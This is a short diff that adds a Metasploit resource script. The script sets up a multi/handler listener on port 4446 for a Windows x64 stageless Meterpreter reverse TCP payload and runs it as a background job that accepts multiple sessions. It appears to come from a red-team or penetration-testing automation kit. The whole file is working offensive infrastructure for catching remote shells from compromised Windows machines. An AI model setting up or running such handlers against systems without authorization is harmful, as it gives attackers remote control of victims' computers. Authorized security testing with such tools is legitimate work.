@@ -1,0 +1,13 @@
+# Windows x64 Stageless Meterpreter Reverse TCP Handler
+# Port: 4446
+# Use when: Staged payloads fail or connection is unstable
+# Note: Stageless = larger payload but more reliable
+# Requires: LHOST set globally via setup_msf_from_auto_recon.sh
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+set LPORT 4446
+set ExitOnSession false
+
+echo "[*] Starting Windows x64 STAGELESS Meterpreter handler on ${LHOST}:4446"
+run -j
